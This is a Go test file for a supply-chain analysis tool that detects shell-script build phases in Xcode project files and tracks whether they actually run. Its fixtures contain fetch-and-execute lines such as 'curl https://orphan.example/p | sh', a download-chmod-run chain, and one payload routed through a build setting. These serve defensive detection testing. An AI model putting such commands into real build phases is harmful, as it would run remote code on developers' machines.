package extract

import (
	"fmt"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestXcodeTargetRunScriptCreatesConnectedRootAndBehavior(t *testing.T) {
	var graph behavior.Graph
	ExtractPackageHooks(&graph, xcodeProjectContent(`
		PROJECT = { isa = PBXProject; targets = (TARGET); };
		TARGET = { isa = PBXNativeTarget; name = App; buildPhases = (PHASE); };
		PHASE = {
			isa = PBXShellScriptBuildPhase;
			name = "Fetch helper";
 runOnlyForDeploymentPostprocessing = 1; alwaysOutOfDate = malformed;
			shellPath = /bin/sh;
			shellScript = "curl https://xcode.example/p -o /tmp/xcode-p && chmod +x /tmp/xcode-p && /tmp/xcode-p";
		};
	`, "PROJECT"))

	if len(graph.ExecutionRoots) != 1 {
		t.Fatalf("execution roots = %#v, want one target-referenced Xcode run script", graph.ExecutionRoots)
	}
	root := graph.ExecutionRoots[0]
	if root.Kind != "xcode-run-script" || root.Name != "Fetch helper" || root.Interpreter != "/bin/sh" || len(root.Arguments) != 0 {
		t.Fatalf("Xcode execution root = %#v", root)
	}
	feature := findXcodeScriptFeature(t, graph)
	if feature.Execution.Connectivity != behavior.ConnectivityConnected || len(feature.Execution.ExecutionRootIDs) != 1 || feature.Execution.ExecutionRootIDs[0] != root.ID {
		t.Fatalf("target run-script feature lost exact root ownership: %#v", feature)
	}
	if feature.Qualifiers["runOnlyForDeploymentPostprocessing"] != "1" || feature.Qualifiers["alwaysOutOfDate"] != "" {
		t.Fatalf("phase flags = %#v", feature.Qualifiers)
	}
	if feature.Qualifiers["phase"] != "Fetch helper" || feature.Qualifiers["shell"] != "/bin/sh" || feature.Qualifiers["targets"] != "App" {
		t.Fatalf("run-script qualifiers = %#v", feature.Qualifiers)
	}
	assertOperation(t, graph, behavior.OperationNetworkDownload, "network-destination", "https://xcode.example/p")
	assertOperation(t, graph, behavior.OperationFileMakeExecutable, "file", "/tmp/xcode-p")
	assertOperation(t, graph, behavior.OperationProcessExecute, "file", "/tmp/xcode-p")
	for _, operation := range graph.Operations {
		if operation.Execution.Connectivity != behavior.ConnectivityConnected {
			t.Fatalf("run-script operation is not execution-backed: %#v", operation)
		}
	}
}

func TestXcodeOrphanRunScriptRemainsUnconnectedInventory(t *testing.T) {
	var graph behavior.Graph
	ExtractPackageHooks(&graph, xcodeProjectContent(`
		PROJECT = { isa = PBXProject; targets = (TARGET); };
		TARGET = { isa = PBXNativeTarget; name = App; buildPhases = (); };
		ORPHAN = {
			isa = PBXShellScriptBuildPhase;
			shellPath = /bin/sh;
			shellScript = "curl https://orphan.example/p | sh";
		};
	`, "PROJECT"))

	feature := findXcodeScriptFeature(t, graph)
	if feature.Execution.Connectivity != behavior.ConnectivityUnknown || len(graph.ExecutionRoots) != 0 || len(graph.Operations) != 0 {
		t.Fatalf("orphan phase became executable behavior: feature=%#v roots=%#v operations=%#v", feature, graph.ExecutionRoots, graph.Operations)
	}
	promoteNodeExecution(&graph, map[string]behavior.ExecutionContext{
		"node-project": connectedExecutionContext([]string{"root-external"}, nil),
	})
	if graph.Features[0].Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("node-level execution promoted an orphan phase: %#v", graph.Features[0])
	}
}

func TestXcodeRunScriptRespectsArtifactRootEligibility(t *testing.T) {
	content := xcodeProjectContent(`
		PROJECT = { isa = PBXProject; targets = (TARGET); };
		TARGET = { isa = PBXNativeTarget; name = App; buildPhases = (PHASE); };
		PHASE = { isa = PBXShellScriptBuildPhase; shellPath = /bin/sh; shellScript = "curl https://ineligible.example/p | sh"; };
	`, "PROJECT")
	content.ExecutionRootEligibilityKnown = true
	content.ExecutionRootEligible = false
	var graph behavior.Graph
	ExtractPackageHooks(&graph, content)
	feature := findXcodeScriptFeature(t, graph)
	if feature.Execution.Connectivity != behavior.ConnectivityUnknown || len(graph.ExecutionRoots) != 0 || len(graph.Operations) != 0 {
		t.Fatalf("ineligible project declaration created execution: feature=%#v roots=%#v operations=%#v", feature, graph.ExecutionRoots, graph.Operations)
	}
}

func TestXcodeNonShellBuildPhaseWithDecoyFieldsIsIgnored(t *testing.T) {
	var graph behavior.Graph
	ExtractPackageHooks(&graph, xcodeProjectContent(`
		PROJECT = { isa = PBXProject; targets = (TARGET); };
		TARGET = { isa = PBXNativeTarget; name = App; buildPhases = (SOURCES); };
		SOURCES = {
			isa = PBXSourcesBuildPhase;
			shellPath = /bin/sh;
			shellScript = "curl https://decoy.example/p | sh";
		};
	`, "PROJECT"))
	if len(graph.Features) != 0 || len(graph.ExecutionRoots) != 0 || len(graph.Operations) != 0 {
		t.Fatalf("non-shell phase fields gained semantics: features=%#v roots=%#v operations=%#v", graph.Features, graph.ExecutionRoots, graph.Operations)
	}
}

func TestXcodeReferencedRunScriptWithoutLiteralShellFailsClosed(t *testing.T) {
	var graph behavior.Graph
	ExtractPackageHooks(&graph, xcodeProjectContent(`
		PROJECT = { isa = PBXProject; targets = (TARGET); };
		TARGET = { isa = PBXNativeTarget; name = App; buildPhases = (PHASE); };
		PHASE = {
			isa = PBXShellScriptBuildPhase;
			shellScript = "curl https://unknown-shell.example/p | sh";
		};
	`, "PROJECT"))
	feature := findXcodeScriptFeature(t, graph)
	if feature.Execution.Connectivity != behavior.ConnectivityUnknown || len(graph.ExecutionRoots) != 0 || len(graph.Operations) != 0 {
		t.Fatalf("phase without shellPath gained executable semantics: feature=%#v roots=%#v operations=%#v", feature, graph.ExecutionRoots, graph.Operations)
	}
	if !hasPartialCoverageScope(graph.Coverage, "xcode-project-run-scripts") {
		t.Fatalf("missing shellPath omitted partial coverage: %#v", graph.Coverage)
	}
}

func TestMalformedXcodeProjectFailsClosed(t *testing.T) {
	var graph behavior.Graph
	ExtractPackageHooks(&graph, artifact.Content{NodeID: "node-project", LogicalPath: "App.xcodeproj/project.pbxproj", Kind: "manifest", Data: []byte(`{ objects = (`)})
	if len(graph.Features) != 0 || len(graph.ExecutionRoots) != 0 || len(graph.Operations) != 0 {
		t.Fatalf("malformed project produced semantics: %#v", graph)
	}
	if !hasPartialCoverageScope(graph.Coverage, "xcode-project") {
		t.Fatalf("malformed project omitted partial coverage: %#v", graph.Coverage)
	}
}

func TestXcodeRunScriptInventoryIsBoundedDeterministically(t *testing.T) {
	var objects strings.Builder
	objects.WriteString(`PROJECT = { isa = PBXProject; targets = (); };`)
	for i := maxXcodeRunScriptPhases + 1; i >= 0; i-- {
		fmt.Fprintf(&objects, `PHASE%04d = { isa = PBXShellScriptBuildPhase; shellPath = /bin/sh; shellScript = "echo %04d"; };`, i, i)
	}
	var graph behavior.Graph
	ExtractPackageHooks(&graph, xcodeProjectContent(objects.String(), "PROJECT"))
	if len(graph.Features) != maxXcodeRunScriptPhases {
		t.Fatalf("run-script inventory = %d, want bound %d", len(graph.Features), maxXcodeRunScriptPhases)
	}
	if !hasPartialCoverageScope(graph.Coverage, "xcode-project-run-scripts") {
		t.Fatalf("bounded phase inventory omitted partial coverage: %#v", graph.Coverage)
	}
	if graph.Features[0].Value != "echo 0000" || graph.Features[len(graph.Features)-1].Value != fmt.Sprintf("echo %04d", maxXcodeRunScriptPhases-1) {
		t.Fatalf("bounded inventory is not stable-ID sorted: first=%q last=%q", graph.Features[0].Value, graph.Features[len(graph.Features)-1].Value)
	}
}

func TestXcodeRunScriptLimitPrioritizesTargetReferencedPhase(t *testing.T) {
	var objects strings.Builder
	objects.WriteString(`PROJECT = { isa = PBXProject; targets = (TARGET); }; TARGET = { isa = PBXNativeTarget; name = App; buildPhases = (ZZ_REFERENCED); };`)
	for i := 0; i < maxXcodeRunScriptPhases+1; i++ {
		fmt.Fprintf(&objects, `AA_PHASE%04d = { isa = PBXShellScriptBuildPhase; shellPath = /bin/sh; shellScript = "echo orphan-%04d"; };`, i, i)
	}
	objects.WriteString(`ZZ_REFERENCED = { isa = PBXShellScriptBuildPhase; name = Important; shellPath = /bin/sh; shellScript = "echo referenced"; };`)
	var graph behavior.Graph
	ExtractPackageHooks(&graph, xcodeProjectContent(objects.String(), "PROJECT"))
	if len(graph.Features) != maxXcodeRunScriptPhases || len(graph.ExecutionRoots) != 1 || graph.ExecutionRoots[0].Name != "Important" {
		t.Fatalf("bounded inventory omitted referenced phase: features=%d roots=%#v", len(graph.Features), graph.ExecutionRoots)
	}
	feature := findXcodeFeatureByValue(t, graph, "echo referenced")
	if feature.Execution.Connectivity != behavior.ConnectivityConnected {
		t.Fatalf("prioritized referenced phase lost connectivity: %#v", feature)
	}
}

func TestXcodeTargetInventoryFailsClosedBeforeOversizedAllocation(t *testing.T) {
	var targetIDs strings.Builder
	for index := 0; index <= maxXcodeTargets; index++ {
		fmt.Fprintf(&targetIDs, "TARGET%04d,", index)
	}
	var graph behavior.Graph
	ExtractPackageHooks(&graph, xcodeProjectContent(
		`PROJECT = { isa = PBXProject; targets = (`+targetIDs.String()+`); };`,
		"PROJECT",
	))
	if len(graph.ExecutionRoots) != 0 || len(graph.Features) != 0 {
		t.Fatalf("oversized target inventory produced executable semantics: %#v", graph)
	}
	if !hasPartialCoverageScope(graph.Coverage, "xcode-project-run-scripts") {
		t.Fatalf("oversized target inventory omitted partial coverage: %#v", graph.Coverage)
	}
}

func TestXcodeIncompleteTargetOwnershipRetainsValidRootButBlocksSettingResolution(t *testing.T) {
	tests := []struct {
		name       string
		targetIDs  string
		extra      string
		wantDetail string
	}{
		{
			name:       "missing root target",
			targetIDs:  "MISSING, TARGET",
			wantDetail: "target references were absent or unsupported",
		},
		{
			name:      "unsupported root target",
			targetIDs: "UNSUPPORTED, TARGET",
			extra: `
				UNSUPPORTED = {
					isa = PBXFutureTarget;
					buildPhases = (PHASE);
				};
			`,
			wantDetail: "target references were absent or unsupported",
		},
		{
			name:      "mixed build phase references",
			targetIDs: "MIXED, TARGET",
			extra: `
				MIXED = {
					isa = PBXNativeTarget;
					buildPhases = (PHASE, { decoy = value; });
				};
			`,
			wantDetail: "buildPhases lists were malformed",
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			project := xcodeProjectContent(fmt.Sprintf(`
				PROJECT = {
					isa = PBXProject;
					targets = (%s);
					buildConfigurationList = PROJECT_LIST;
				};
				TARGET = {
					isa = PBXNativeTarget;
					name = App;
					buildPhases = (PHASE);
					buildConfigurationList = TARGET_LIST;
				};
				PHASE = {
					isa = PBXShellScriptBuildPhase;
					name = Resolve;
					shellPath = /bin/sh;
					shellScript = "sh -c \"${PAYLOAD}\"";
				};
				PROJECT_LIST = {
					isa = XCConfigurationList;
					buildConfigurations = (PROJECT_DEBUG);
				};
				TARGET_LIST = {
					isa = XCConfigurationList;
					buildConfigurations = (TARGET_DEBUG);
				};
				PROJECT_DEBUG = {
					isa = XCBuildConfiguration;
					name = Debug;
					buildSettings = {
						PAYLOAD = "curl https://incomplete-owner.example/p | sh";
					};
				};
				TARGET_DEBUG = {
					isa = XCBuildConfiguration;
					name = Debug;
					buildSettings = {};
				};
				%s
			`, test.targetIDs, test.extra), "PROJECT")

			var graph behavior.Graph
			ExtractPackageHooks(&graph, project)
			if len(graph.ExecutionRoots) != 1 || graph.ExecutionRoots[0].Name != "Resolve" {
				t.Fatalf("valid target root was not retained: %#v", graph.ExecutionRoots)
			}
			ResolveXcodeBuildSettings(&graph, nil, []artifact.Content{project})
			if hasXcodeResolvedSettingFeature(graph, "PAYLOAD") || len(graph.Operations) != 0 {
				t.Fatalf("incomplete target ownership produced resolved behavior: %#v", graph)
			}
			if !coverageDetailContains(graph.Coverage, "xcode-project-run-scripts", test.wantDetail) {
				t.Fatalf("incomplete target ownership omitted %q coverage: %#v", test.wantDetail, graph.Coverage)
			}
			if !coverageDetailContains(graph.Coverage, "xcode-build-setting-resolution", "target build-phase references were incomplete") {
				t.Fatalf("resolver did not report incomplete ownership: %#v", graph.Coverage)
			}
		})
	}
}

func xcodeProjectContent(objects, rootObject string) artifact.Content {
	return artifact.Content{
		NodeID:      "node-project",
		LogicalPath: "App.xcodeproj/project.pbxproj",
		Kind:        "manifest",
		Data: []byte(`// !$*UTF8*$!
{
	archiveVersion = 1;
	objectVersion = 56;
	objects = {` + objects + `};
	rootObject = ` + rootObject + `;
}`),
	}
}

func findXcodeScriptFeature(t *testing.T, graph behavior.Graph) behavior.Feature {
	t.Helper()
	for _, feature := range graph.Features {
		if feature.Key == "xcode.build_phase.shell_script" {
			return feature
		}
	}
	t.Fatalf("missing Xcode run-script feature: %#v", graph.Features)
	return behavior.Feature{}
}

func findXcodeFeatureByValue(t *testing.T, graph behavior.Graph, value string) behavior.Feature {
	t.Helper()
	for _, feature := range graph.Features {
		if feature.Key == "xcode.build_phase.shell_script" && feature.Value == value {
			return feature
		}
	}
	t.Fatalf("missing Xcode run-script feature %q", value)
	return behavior.Feature{}
}
